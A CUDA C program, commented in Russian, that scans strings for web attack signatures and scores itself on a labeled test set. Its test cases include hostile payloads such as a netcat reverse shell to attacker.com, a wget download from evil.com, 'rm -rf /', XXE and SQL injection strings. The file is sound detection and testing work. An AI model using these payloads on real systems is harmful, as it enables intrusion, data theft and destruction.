#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <cuda_runtime.h>
#include <time.h>

#define MAX_INPUT_LEN 256
#define BLOCK_SIZE 256

// Типы уязвимостей
#define VULN_NONE           0
#define VULN_PATH_TRAVERSAL 1
#define VULN_XSS            2
#define VULN_SQL_INJECTION  3
#define VULN_CMD_INJECTION  4
#define VULN_LDAP_INJECTION 5
#define VULN_XXE            6
#define VULN_SSRF           7

// =============================================================================
// Device функции для работы со строками
// =============================================================================

__device__ int d_strlen(const char* str) {
    int len = 0;
    while (str[len] != '\0' && len < MAX_INPUT_LEN) len++;
    return len;
}

__device__ int d_strstr(const char* haystack, const char* needle, int haystack_len) {
    int needle_len = 0;
    while (needle[needle_len] != '\0') needle_len++;

    if (needle_len == 0) return 1;
    if (haystack_len < needle_len) return 0;

    for (int i = 0; i <= haystack_len - needle_len; i++) {
        int match = 1;
        for (int j = 0; j < needle_len; j++) {
            if (haystack[i + j] != needle[j]) {
                match = 0;
                break;
            }
        }
        if (match) return 1;
    }
    return 0;
}

// Case-insensitive strstr
__device__ int d_stristr(const char* haystack, const char* needle, int haystack_len) {
    int needle_len = 0;
    while (needle[needle_len] != '\0') needle_len++;

    if (needle_len == 0) return 1;
    if (haystack_len < needle_len) return 0;

    for (int i = 0; i <= haystack_len - needle_len; i++) {
        int match = 1;
        for (int j = 0; j < needle_len; j++) {
            char h = haystack[i + j];
            char n = needle[j];
            // To lowercase
            if (h >= 'A' && h <= 'Z') h += 32;
            if (n >= 'A' && n <= 'Z') n += 32;
            if (h != n) {
                match = 0;
                break;
            }
        }
        if (match) return 1;
    }
    return 0;
}

// =============================================================================
// CUDA Kernel для детектирования уязвимостей
// =============================================================================

__global__ void detectVulnerabilities(const char* inputs, int* results, int n, int input_len) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;

    if (idx >= n) return;

    const char* str = &inputs[idx * input_len];
    int len = d_strlen(str);
    int vuln = VULN_NONE;

    // === Path Traversal ===
    if (d_strstr(str, "../", len) ||
        d_strstr(str, "..\\", len) ||
        d_strstr(str, "%2e%2e%2f", len) ||
        d_strstr(str, "%2e%2e/", len) ||
        d_strstr(str, "..%2f", len) ||
        d_strstr(str, "%2e%2e%5c", len) ||
        d_strstr(str, "/etc/passwd", len) ||
        d_strstr(str, "/etc/shadow", len) ||
        d_strstr(str, "c:\\windows", len) ||
        d_strstr(str, "....//", len)) {
        vuln = VULN_PATH_TRAVERSAL;
    }

    // === XSS (Cross-Site Scripting) ===
    else if (d_stristr(str, "<script", len) ||
             d_stristr(str, "javascript:", len) ||
             d_stristr(str, "onerror=", len) ||
             d_stristr(str, "onload=", len) ||
             d_stristr(str, "onclick=", len) ||
             d_stristr(str, "onmouseover=", len) ||
             d_stristr(str, "<iframe", len) ||
             d_stristr(str, "<svg", len) ||
             d_stristr(str, "<img", len) ||
             d_stristr(str, "alert(", len) ||
             d_stristr(str, "document.cookie", len) ||
             d_stristr(str, "eval(", len) ||
             d_strstr(str, "%3cscript", len) ||
             d_strstr(str, "&#x3c;script", len)) {
        vuln = VULN_XSS;
    }

    // === SQL Injection ===
    else if (d_stristr(str, "' or '", len) ||
             d_stristr(str, "' or 1=1", len) ||
             d_stristr(str, "\" or \"", len) ||
             d_stristr(str, "1=1--", len) ||
             d_stristr(str, "' --", len) ||
             d_stristr(str, "'; drop", len) ||
             d_stristr(str, "union select", len) ||
             d_stristr(str, "union all select", len) ||
             d_stristr(str, "select * from", len) ||
             d_stristr(str, "insert into", len) ||
             d_stristr(str, "delete from", len) ||
             d_stristr(str, "update ", len) ||
             d_stristr(str, "drop table", len) ||
             d_stristr(str, "exec(", len) ||
             d_stristr(str, "execute(", len) ||
             d_strstr(str, "0x", len) ||
             d_stristr(str, "waitfor delay", len) ||
             d_stristr(str, "benchmark(", len) ||
             d_stristr(str, "sleep(", len) ||
             d_stristr(str, "having 1=1", len) ||
             d_stristr(str, "group by", len) ||
             d_stristr(str, "order by", len)) {
        vuln = VULN_SQL_INJECTION;
    }

    // === Command Injection ===
    else if (d_strstr(str, "; ls", len) ||
             d_strstr(str, "| ls", len) ||
             d_strstr(str, "& ls", len) ||
             d_strstr(str, "; cat", len) ||
             d_strstr(str, "| cat", len) ||
             d_strstr(str, "; rm", len) ||
             d_strstr(str, "; wget", len) ||
             d_strstr(str, "; curl", len) ||
             d_strstr(str, "| nc ", len) ||
             d_strstr(str, "; nc ", len) ||
             d_strstr(str, "`", len) ||
             d_strstr(str, "$(", len) ||
             d_strstr(str, "%0a", len) ||
             d_strstr(str, "%0d", len) ||
             d_strstr(str, "&&", len) ||
             d_strstr(str, "||", len) ||
             d_strstr(str, "; ping", len) ||
             d_strstr(str, "| ping", len) ||
             d_strstr(str, "; whoami", len) ||
             d_strstr(str, "| whoami", len) ||
             d_strstr(str, "; id", len) ||
             d_strstr(str, "/bin/sh", len) ||
             d_strstr(str, "/bin/bash", len) ||
             d_strstr(str, "cmd.exe", len) ||
             d_strstr(str, "powershell", len)) {
        vuln = VULN_CMD_INJECTION;
    }

    // === LDAP Injection ===
    else if (d_strstr(str, ")(", len) ||
             d_strstr(str, "*))", len) ||
             d_strstr(str, "*)(uid=*", len) ||
             d_strstr(str, "*()|", len) ||
             d_strstr(str, "\\00", len)) {
        vuln = VULN_LDAP_INJECTION;
    }

    // === XXE (XML External Entity) ===
    else if (d_stristr(str, "<!entity", len) ||
             d_stristr(str, "<!doctype", len) ||
             d_strstr(str, "system \"file:", len) ||
             d_strstr(str, "system 'file:", len) ||
             d_stristr(str, "<!element", len) ||
             d_strstr(str, "expect://", len)) {
        vuln = VULN_XXE;
    }

    // === SSRF (Server-Side Request Forgery) ===
    else if (d_strstr(str, "127.0.0.1", len) ||
             d_strstr(str, "localhost", len) ||
             d_strstr(str, "0.0.0.0", len) ||
             d_strstr(str, "169.254.", len) ||
             d_strstr(str, "10.0.", len) ||
             d_strstr(str, "192.168.", len) ||
             d_strstr(str, "172.16.", len) ||
             d_strstr(str, "file://", len) ||
             d_strstr(str, "gopher://", len) ||
             d_strstr(str, "dict://", len) ||
             d_strstr(str, "ftp://", len)) {
        vuln = VULN_SSRF;
    }

    results[idx] = vuln;
}

// =============================================================================
// Вспомогательные функции
// =============================================================================

const char* getVulnName(int vuln) {
    switch (vuln) {
        case VULN_NONE: return "Clean";
        case VULN_PATH_TRAVERSAL: return "Path Traversal";
        case VULN_XSS: return "XSS";
        case VULN_SQL_INJECTION: return "SQL Injection";
        case VULN_CMD_INJECTION: return "Command Injection";
        case VULN_LDAP_INJECTION: return "LDAP Injection";
        case VULN_XXE: return "XXE";
        case VULN_SSRF: return "SSRF";
        default: return "Unknown";
    }
}

// =============================================================================
// Тестовые данные
// =============================================================================

typedef struct {
    const char* input;
    int expected;
} TestCase;

TestCase testCases[] = {
    // Clean inputs
    {"hello world", VULN_NONE},
    {"user@example.com", VULN_NONE},
    {"normal search query", VULN_NONE},
    {"John Doe", VULN_NONE},
    {"12345", VULN_NONE},
    {"product_id=100", VULN_NONE},
    {"page=home", VULN_NONE},
    {"The quick brown fox", VULN_NONE},
    {"2024-01-15", VULN_NONE},
    {"https://example.com/page", VULN_NONE},

    // Path Traversal
    {"../../etc/passwd", VULN_PATH_TRAVERSAL},
    {"..\\..\\windows\\system32", VULN_PATH_TRAVERSAL},
    {"%2e%2e%2f%2e%2e%2fetc/passwd", VULN_PATH_TRAVERSAL},
    {"....//....//etc/passwd", VULN_PATH_TRAVERSAL},
    {"/etc/shadow", VULN_PATH_TRAVERSAL},
    {"c:\\windows\\system.ini", VULN_PATH_TRAVERSAL},
    {"..%2f..%2f..%2fetc/passwd", VULN_PATH_TRAVERSAL},

    // XSS
    {"<script>alert('XSS')</script>", VULN_XSS},
    {"<img src=x onerror=alert(1)>", VULN_XSS},
    {"javascript:alert(document.cookie)", VULN_XSS},
    {"<svg onload=alert(1)>", VULN_XSS},
    {"<iframe src='evil.com'>", VULN_XSS},
    {"%3cscript%3ealert(1)%3c/script%3e", VULN_XSS},
    {"<body onload=alert('XSS')>", VULN_XSS},
    {"<div onclick=alert(1)>click</div>", VULN_XSS},
    {"eval('malicious code')", VULN_XSS},
    {"document.cookie", VULN_XSS},

    // SQL Injection
    {"' OR '1'='1", VULN_SQL_INJECTION},
    {"admin'--", VULN_SQL_INJECTION},
    {"1; DROP TABLE users--", VULN_SQL_INJECTION},
    {"' UNION SELECT * FROM users--", VULN_SQL_INJECTION},
    {"1' OR 1=1--", VULN_SQL_INJECTION},
    {"'; DELETE FROM users;--", VULN_SQL_INJECTION},
    {"' UNION ALL SELECT password FROM users--", VULN_SQL_INJECTION},
    {"'; EXEC xp_cmdshell('dir');--", VULN_SQL_INJECTION},
    {"' AND SLEEP(5)--", VULN_SQL_INJECTION},
    {"'; WAITFOR DELAY '0:0:5'--", VULN_SQL_INJECTION},
    {"1 HAVING 1=1--", VULN_SQL_INJECTION},
    {"' GROUP BY columnname--", VULN_SQL_INJECTION},
    {"' ORDER BY 1--", VULN_SQL_INJECTION},
    {"'; INSERT INTO users VALUES('hacker','pass');--", VULN_SQL_INJECTION},
    {"' AND benchmark(10000000,SHA1('test'))--", VULN_SQL_INJECTION},
    {"0x27204f522027313d2731", VULN_SQL_INJECTION},

    // Command Injection
    {"; ls -la", VULN_CMD_INJECTION},
    {"| cat /etc/passwd", VULN_CMD_INJECTION},
    {"& whoami", VULN_CMD_INJECTION},
    {"; rm -rf /", VULN_CMD_INJECTION},
    {"$(whoami)", VULN_CMD_INJECTION},
    {"`id`", VULN_CMD_INJECTION},
    {"; wget http://evil.com/shell.sh", VULN_CMD_INJECTION},
    {"| nc -e /bin/sh attacker.com 4444", VULN_CMD_INJECTION},
    {"%0a cat /etc/passwd", VULN_CMD_INJECTION},
    {"test && cat /etc/passwd", VULN_CMD_INJECTION},
    {"test || cat /etc/passwd", VULN_CMD_INJECTION},
    {"; ping -c 10 127.0.0.1", VULN_CMD_INJECTION},
    {"/bin/bash -c 'cat /etc/passwd'", VULN_CMD_INJECTION},
    {"cmd.exe /c dir", VULN_CMD_INJECTION},
    {"powershell -Command Get-Process", VULN_CMD_INJECTION},

    // LDAP Injection
    {"*)(uid=*))(|(uid=*", VULN_LDAP_INJECTION},
    {"admin)(|(password=*", VULN_LDAP_INJECTION},
    {"*))%00", VULN_LDAP_INJECTION},

    // XXE
    {"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", VULN_XXE},
    {"<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'>", VULN_XXE},
    {"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'expect://id'>]>", VULN_XXE},

    // SSRF
    {"http://127.0.0.1/admin", VULN_SSRF},
    {"http://localhost:8080/internal", VULN_SSRF},
    {"http://192.168.1.1/router", VULN_SSRF},
    {"http://169.254.169.254/metadata", VULN_SSRF},
    {"file:///etc/passwd", VULN_SSRF},
    {"gopher://127.0.0.1:25/", VULN_SSRF},
    {"http://10.0.0.1/internal", VULN_SSRF},
    {"dict://127.0.0.1:11211/", VULN_SSRF},
    {"http://172.16.0.1/admin", VULN_SSRF},
    {"ftp://internal-server/files", VULN_SSRF},

    // Дополнительные чистые входы для баланса
    {"My name is Alice", VULN_NONE},
    {"Contact: +1-555-0123", VULN_NONE},
    {"Price: $99.99", VULN_NONE},
    {"Rating: 4.5 stars", VULN_NONE},
    {"Posted on 2024-03-15", VULN_NONE},
    {"Category: Electronics", VULN_NONE},
    {"Size: Medium", VULN_NONE},
    {"Color: Blue", VULN_NONE},
    {"Quantity: 5", VULN_NONE},
    {"Status: Active", VULN_NONE},
    {"Welcome to our website!", VULN_NONE},
    {"Thank you for your purchase", VULN_NONE},
    {"Please enter your email", VULN_NONE},
    {"Your order has been confirmed", VULN_NONE},
    {"Subscribe to newsletter", VULN_NONE},
};

int numTestCases = sizeof(testCases) / sizeof(TestCase);

// =============================================================================
// Main
// =============================================================================

int main() {
    printf("==============================================\n");
    printf("  Web Vulnerability Analyzer (CUDA)\n");
    printf("==============================================\n\n");

    // Проверка GPU
    int deviceCount;
    cudaGetDeviceCount(&deviceCount);
    if (deviceCount == 0) {
        printf("ERROR: No CUDA-capable GPU found!\n");
        return 1;
    }

    cudaDeviceProp prop;
    cudaGetDeviceProperties(&prop, 0);
    printf("GPU: %s\n", prop.name);
    printf("Compute Capability: %d.%d\n\n", prop.major, prop.minor);

    // Подготовка данных
    int n = numTestCases;
    size_t inputsSize = n * MAX_INPUT_LEN;
    size_t resultsSize = n * sizeof(int);

    // Host память
    char* h_inputs = (char*)malloc(inputsSize);
    int* h_results = (int*)malloc(resultsSize);
    int* h_expected = (int*)malloc(resultsSize);

    memset(h_inputs, 0, inputsSize);

    // Копируем тестовые данные
    for (int i = 0; i < n; i++) {
        strncpy(&h_inputs[i * MAX_INPUT_LEN], testCases[i].input, MAX_INPUT_LEN - 1);
        h_expected[i] = testCases[i].expected;
    }

    // Device память
    char* d_inputs;
    int* d_results;

    cudaMalloc(&d_inputs, inputsSize);
    cudaMalloc(&d_results, resultsSize);

    // Копируем на GPU
    cudaMemcpy(d_inputs, h_inputs, inputsSize, cudaMemcpyHostToDevice);

    // Запускаем kernel
    int numBlocks = (n + BLOCK_SIZE - 1) / BLOCK_SIZE;

    printf("Running analysis on %d test cases...\n", n);
    printf("Blocks: %d, Threads per block: %d\n\n", numBlocks, BLOCK_SIZE);

    // Замер времени
    cudaEvent_t start, stop;
    cudaEventCreate(&start);
    cudaEventCreate(&stop);

    cudaEventRecord(start);
    detectVulnerabilities<<<numBlocks, BLOCK_SIZE>>>(d_inputs, d_results, n, MAX_INPUT_LEN);
    cudaEventRecord(stop);

    cudaEventSynchronize(stop);

    float milliseconds = 0;
    cudaEventElapsedTime(&milliseconds, start, stop);

    // Копируем результаты
    cudaMemcpy(h_results, d_results, resultsSize, cudaMemcpyDeviceToHost);

    // Подсчёт метрик
    int tp = 0, tn = 0, fp = 0, fn = 0;
    int correct = 0;
    int errors = 0;

    printf("=== Results ===\n\n");

    for (int i = 0; i < n; i++) {
        int expected = h_expected[i];
        int detected = h_results[i];

        int is_expected_vuln = (expected != VULN_NONE);
        int is_detected_vuln = (detected != VULN_NONE);

        if (is_expected_vuln && is_detected_vuln) tp++;
        else if (!is_expected_vuln && !is_detected_vuln) tn++;
        else if (!is_expected_vuln && is_detected_vuln) fp++;
        else if (is_expected_vuln && !is_detected_vuln) fn++;

        if (detected == expected) {
            correct++;
        } else {
            errors++;
            printf("[MISMATCH] Input: \"%.50s...\"\n", testCases[i].input);
            printf("           Expected: %s, Got: %s\n\n",
                   getVulnName(expected), getVulnName(detected));
        }
    }

    // Вычисление метрик
    double precision = (tp + fp > 0) ? (double)tp / (tp + fp) : 0;
    double recall = (tp + fn > 0) ? (double)tp / (tp + fn) : 0;
    double f1 = (precision + recall > 0) ? 2 * precision * recall / (precision + recall) : 0;
    double accuracy = (double)correct / n;
    double throughput = (milliseconds > 0) ? n / (milliseconds / 1000.0) : 0;

    printf("==============================================\n");
    printf("  Performance Metrics\n");
    printf("==============================================\n");
    printf("Total test cases:  %d\n", n);
    printf("Correct:           %d\n", correct);
    printf("Errors:            %d\n", errors);
    printf("\n");
    printf("True Positives:    %d\n", tp);
    printf("True Negatives:    %d\n", tn);
    printf("False Positives:   %d\n", fp);
    printf("False Negatives:   %d\n", fn);
    printf("\n");
    printf("Accuracy:          %.2f%%\n", accuracy * 100);
    printf("Precision:         %.2f%% (target: >=95%%)\n", precision * 100);
    printf("Recall:            %.2f%% (target: >=98%%)\n", recall * 100);
    printf("F1-Score:          %.2f%% (target: >=96%%)\n", f1 * 100);
    printf("\n");
    printf("GPU Time:          %.3f ms\n", milliseconds);
    printf("Throughput:        %.0f strings/sec (target: >=10000)\n", throughput);
    printf("==============================================\n");

    // Проверка требований
    printf("\n=== Requirements Check ===\n");
    printf("Precision >= 95%%:    %s\n", precision >= 0.95 ? "PASS" : "FAIL");
    printf("Recall >= 98%%:       %s\n", recall >= 0.98 ? "PASS" : "FAIL");
    printf("F1-Score >= 96%%:     %s\n", f1 >= 0.96 ? "PASS" : "FAIL");
    printf("Throughput >= 10000: %s\n", throughput >= 10000 ? "PASS" : "FAIL");

    // Тест производительности на большом объёме
    printf("\n=== Performance Test (100000 strings) ===\n");

    int perf_n = 100000;
    size_t perf_inputs_size = perf_n * MAX_INPUT_LEN;
    size_t perf_results_size = perf_n * sizeof(int);

    char* perf_h_inputs = (char*)malloc(perf_inputs_size);
    int* perf_h_results = (int*)malloc(perf_results_size);

    memset(perf_h_inputs, 0, perf_inputs_size);

    // Заполняем тестовыми данными циклически
    for (int i = 0; i < perf_n; i++) {
        strncpy(&perf_h_inputs[i * MAX_INPUT_LEN],
                testCases[i % numTestCases].input, MAX_INPUT_LEN - 1);
    }

    char* perf_d_inputs;
    int* perf_d_results;

    cudaMalloc(&perf_d_inputs, perf_inputs_size);
    cudaMalloc(&perf_d_results, perf_results_size);

    cudaMemcpy(perf_d_inputs, perf_h_inputs, perf_inputs_size, cudaMemcpyHostToDevice);

    int perf_blocks = (perf_n + BLOCK_SIZE - 1) / BLOCK_SIZE;

    cudaEventRecord(start);
    detectVulnerabilities<<<perf_blocks, BLOCK_SIZE>>>(perf_d_inputs, perf_d_results, perf_n, MAX_INPUT_LEN);
    cudaEventRecord(stop);

    cudaEventSynchronize(stop);
    cudaEventElapsedTime(&milliseconds, start, stop);

    double perf_throughput = perf_n / (milliseconds / 1000.0);

    printf("Strings processed: %d\n", perf_n);
    printf("GPU Time:          %.3f ms\n", milliseconds);
    printf("Throughput:        %.0f strings/sec\n", perf_throughput);
    printf("Requirement met:   %s\n", perf_throughput >= 10000 ? "PASS" : "FAIL");

    // Освобождение памяти
    cudaEventDestroy(start);
    cudaEventDestroy(stop);

    cudaFree(d_inputs);
    cudaFree(d_results);
    cudaFree(perf_d_inputs);
    cudaFree(perf_d_results);

    free(h_inputs);
    free(h_results);
    free(h_expected);
    free(perf_h_inputs);
    free(perf_h_results);

    return 0;
}
